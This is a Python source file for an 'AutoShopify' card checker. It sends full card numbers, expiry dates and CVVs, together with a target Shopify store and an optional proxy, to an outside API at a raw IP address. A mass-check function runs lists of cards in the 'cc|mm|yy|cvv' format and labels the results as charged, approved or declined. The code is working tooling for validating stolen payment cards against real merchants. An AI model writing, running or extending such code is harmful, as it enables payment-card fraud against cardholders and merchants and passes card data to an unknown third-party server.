"""
AutoShopify Gateway with Site Checking and Proxy Support
API: http://31.97.9.26:3000/autog
"""
import aiohttp
import asyncio
import json
import re
from typing import Dict, Optional

async def autoshopify_check(
    cc: str, 
    mm: str, 
    yy: str, 
    cvv: str, 
    site: str,
    proxy: Optional[str] = None
) -> Dict:
    """
    AutoShopify gateway with site and proxy support
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
        site: Shopify site URL
        proxy: Proxy string (format: host:port:user:pass)
    
    Returns:
        dict: {'status': str, 'response': str, 'gateway': str, 'price': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # Validate site
    if not site or not ('shopify' in site.lower() or '.com' in site):
        return {
            'status': 'Declined',
            'response': 'Invalid Shopify site URL',
            'gateway': 'AutoShopify',
            'price': '$0.98'
        }
    
    # Ensure site has protocol
    if not site.startswith('http'):
        site = f'https://{site}'
    
    # Build API URL
    api_url = f"http://31.97.9.26:3000/autog?cc={full_card}&site={site}"
    
    # Add proxy if provided
    if proxy:
        api_url += f"&proxy={proxy}"
    
    try:
        # Configure timeout
        timeout = aiohttp.ClientTimeout(total=180)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                api_url,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
            ) as resp:
                if resp.status != 200:
                    return {
                        'status': 'Declined',
                        'response': f'API returned HTTP {resp.status}',
                        'gateway': 'AutoShopify',
                        'price': '$0.98'
                    }
                
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    # Try to extract JSON from text
                    match = re.search(r'\{.*\}', api_response, re.DOTALL)
                    if match:
                        try:
                            data = json.loads(match.group(0))
                        except:
                            data = {'Response': api_response[:200]}
                    else:
                        data = {'Response': api_response[:200]}
                
                # Extract response data
                response = data.get('Response') or data.get('response') or data.get('msg') or 'No response'
                gateway = data.get('Gateway') or data.get('gateway') or 'Shopify'
                price = data.get('Price') or data.get('price') or '$0.98'
                
                # Determine status based on response
                response_lower = str(response).lower()
                
                # Charged indicators
                if any(keyword in response_lower for keyword in [
                    'thank you', 'order placed', 'payment successful', 
                    'successfully charged', 'order confirmed'
                ]):
                    status = 'Charged'
                
                # Approved indicators
                elif any(keyword in response_lower for keyword in [
                    'approved', '3ds', 'authenticate', 'cvv', 'cvc',
                    'incorrect_cvc', 'incorrect_zip', 'avs', 'postal',
                    'insufficient funds', 'success'
                ]):
                    status = 'Approved'
                
                # Declined indicators
                elif any(keyword in response_lower for keyword in [
                    'declined', 'card declined', 'do_not_honor',
                    'generic_decline', 'invalid', 'expired'
                ]):
                    status = 'Declined'
                
                # Unknown
                else:
                    status = 'Unknown'
                
                return {
                    'status': status,
                    'response': response,
                    'gateway': gateway,
                    'price': price
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Declined',
            'response': 'Request timed out after 3 minutes',
            'gateway': 'AutoShopify',
            'price': '$0.98'
        }
    except Exception as e:
        return {
            'status': 'Declined',
            'response': f'Connection error: {str(e)[:100]}',
            'gateway': 'AutoShopify',
            'price': '$0.98'
        }


async def autoshopify_mass_check(
    cards: list,
    site: str,
    proxy: Optional[str] = None
) -> list:
    """
    Mass check multiple cards (limit 10)
    
    Args:
        cards: List of card strings (cc|mm|yy|cvv)
        site: Shopify site URL
        proxy: Optional proxy
    
    Returns:
        list: List of result dicts
    """
    # Limit to 10 cards
    cards = cards[:10]
    
    results = []
    for card in cards:
        parts = card.split('|')
        if len(parts) != 4:
            results.append({
                'card': card,
                'status': 'Declined',
                'response': 'Invalid card format',
                'gateway': 'AutoShopify',
                'price': '$0.98'
            })
            continue
        
        cc, mm, yy, cvv = parts
        result = await autoshopify_check(cc, mm, yy, cvv, site, proxy)
        result['card'] = card
        results.append(result)
        
        # Small delay between checks
        await asyncio.sleep(1)
    
    return results
